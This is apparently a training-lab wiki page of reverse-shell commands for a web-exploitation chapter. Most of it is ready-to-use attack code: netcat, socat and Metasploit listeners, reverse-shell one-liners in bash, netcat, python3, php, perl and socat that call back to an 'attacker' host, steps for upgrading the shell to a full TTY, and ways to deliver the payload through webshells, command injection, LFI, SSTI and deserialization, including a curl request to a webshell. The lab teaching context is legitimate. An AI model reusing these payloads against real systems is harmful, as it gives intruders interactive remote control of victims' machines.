# Reverse-Shell Reference

> The companion to [[Chapter-09-Overview]]. Every web route in that chapter ends
> with "now run a command as `www-data`" — this page turns that into an
> interactive shell on your attacker box, upgrades it to a real TTY, and shows
> how to deliver the payload through a web bug. Keep it open while you work the
> six stations.

Across the lab the callback host is the `attacker` container (resolvable by name
on `labnet`) and the port is `4444`. Swap in your own IP/port off-range.

---

## 0. The model

A **reverse** shell has the target connect *out* to a listener you already have
running — it beats a bind shell because outbound traffic usually isn't filtered
and the target rarely accepts inbound. Two halves:

1. **Listener** on the attacker (catches the connection).
2. **Payload** on the target (makes the connection and wires a shell to it).

Start the listener **first**, then fire the payload.

---

## 1. Listeners (run on the attacker)

```bash
nc -lvnp 4444                 # netcat: -l listen, -v verbose, -n no DNS, -p port
ncat -lvnp 4444               # nmap's ncat (add --ssl for an encrypted catcher)
socat -d -d TCP-LISTEN:4444,reuseaddr STDOUT     # socat, pairs with a socat payload
```

Metasploit's handler, when you want sessions/upgrades for free:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD linux/x64/shell_reverse_tcp; \
  set LHOST 0.0.0.0; set LPORT 4444; run"
```

A bare `nc` listener catches a **dumb** shell (no job control, no tab-complete,
Ctrl-C kills it). Section 3 upgrades it.

---

## 2. Payloads (run on the target, as www-data)

Pick the first one whose binary exists. `which bash python3 php perl nc socat`
tells you what you have.

### bash `/dev/tcp` (no nc needed — most reliable here)

```bash
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

`/dev/tcp/host/port` is a **bash** feature — it does not exist in `sh`/dash. Web
sinks (`system`, `shell_exec`) run under `/bin/sh`, so **wrap it in `bash -c`**
or the redirect fails silently. This is the payload every Chapter 09 station
uses.

### netcat

```bash
nc attacker 4444 -e /bin/bash                       # if this nc build has -e
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker 4444 > /tmp/f
```

Most modern `nc` (OpenBSD, `netcat-traditional` as shipped) **lacks `-e`** for
safety — use the `mkfifo` form. It works with any netcat.

### python3 (clean PTY in one shot)

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

### php

```bash
php -r '$s=fsockopen("attacker",4444);$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$pipes);'
```

### perl

```bash
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### socat (fullest TTY, if socat is on the target)

```bash
# listener:  socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:attacker:4444
```

---

## 3. Upgrade a dumb shell to a full TTY

A `nc` shell can't use `sudo` (needs a tty), `vi`, `su`, or Ctrl-C without
dying. Upgrade it:

```bash
# on the target shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'   # (or: script -qc /bin/bash /dev/null)
# background it: press Ctrl-Z
# on the attacker:
stty raw -echo; fg
# back in the shell (it won't echo 'fg'):
export TERM=xterm
stty rows 50 cols 200        # match your terminal (see `stty -a` locally)
```

Now Ctrl-C, arrow keys, `sudo`, and `less` all behave. For Chapter 09 the
capstone `sudo /usr/bin/php -r 'system("/bin/sh")'` works even without a tty
(NOPASSWD, no `requiretty`), but the upgrade makes everything else bearable.

---

## 4. Delivering the payload through a web bug

The web sink matters. Pick the delivery to match the station:

| Station | How the payload reaches the shell |
|---|---|
| A / B (upload) | `GET /uploads/shell.php?c=<payload>` — webshell runs `system($_GET['c'])` |
| C (command injection) | `host=127.0.0.1; <payload>` |
| D (LFI) | poison a log / wrapper with `<?php system($_GET['c']);?>`, then `?c=<payload>` |
| E (SSTI) | `name={{['<payload>']|map('system')}}` |
| F (deserialization) | `cmd` property of the gadget = `<payload>` |

**Always URL-encode** the payload when it travels in a query string — spaces,
`&`, `;`, `>`, and quotes will otherwise break the request. With curl:

```bash
curl -G 'http://target-web/uploads/shell.php' \
  --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

In Burp, send the raw payload and let Burp encode it (Ctrl-U on a selection in
Repeater URL-encodes). Quick reference for hand-encoding:

| char | ` ` | `"` | `&` | `;` | `<` | `>` | `|` | `+` | `/` |
|------|-----|-----|-----|-----|-----|-----|-----|-----|-----|
| enc  | `%20` / `+` | `%22` | `%26` | `%3b` | `%3c` | `%3e` | `%7c` | `%2b` | `%2f` |

---

## 5. Troubleshooting

- **Listener shows a connection, then nothing** → the payload used `sh` for
  `/dev/tcp`. Re-send wrapped in `bash -c`.
- **Shell dies on Ctrl-C** → it's a dumb shell; do the §3 upgrade.
- **`sudo` says "no tty"** → upgrade the shell, or use `sudo -S` / a NOPASSWD
  command that doesn't need a tty.
- **Nothing connects back** → wrong callback host/port, egress filtered, or the
  payload never ran. Test exec first (`?c=id`), then the shell.
- **`-e` not supported** → your `nc` is the safe build; use the `mkfifo` form.

---

## 6. The one habit

Start the listener, confirm **code execution** with `id` before anything fancy,
then fire the shell wrapped in `bash -c`, then upgrade the TTY. Back to the
exploits: [[Chapter-09-Overview]]. Defender's side — killing reverse shells with
egress filtering and `disable_functions`: [[Blue-Team-Playbook]].

> Related: [[Chapter-09-Overview]] · [[C09-Station-A-Unrestricted-Upload]] · [[Blue-Team-Playbook]]
